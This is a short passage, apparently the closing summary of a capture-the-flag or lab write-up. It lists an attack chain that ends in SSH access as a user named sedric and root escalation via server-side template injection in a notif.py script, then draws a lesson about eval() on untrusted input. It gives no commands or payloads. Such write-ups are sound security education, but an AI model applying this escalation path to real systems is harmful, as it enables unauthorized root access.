4. **User Privilege:** Gained SSH access as the sedric user
5. **Root Escalation:** Exploited server-side template injection in the notif.py script to gain root access

The vulnerability chain demonstrates the critical nature of proper input validation and the dangers of using eval() on user-controlled data.